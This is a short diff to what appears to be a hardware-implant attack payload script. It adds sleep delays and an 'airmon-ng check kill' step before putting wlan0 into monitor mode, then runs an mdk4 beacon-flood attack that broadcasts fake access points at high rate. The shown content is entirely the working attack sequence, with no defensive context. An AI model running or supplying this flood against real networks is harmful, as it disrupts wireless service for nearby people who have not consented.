@@ -6,6 +6,10 @@
 # Version: 1.0
 
 LED SETUP
+sleep 10
+airmon-ng check kill
+sleep 10
 airmon-ng start wlan0
+sleep 10
 LED ATTACK
 mdk4 wlan0mon b -a -m -s 500
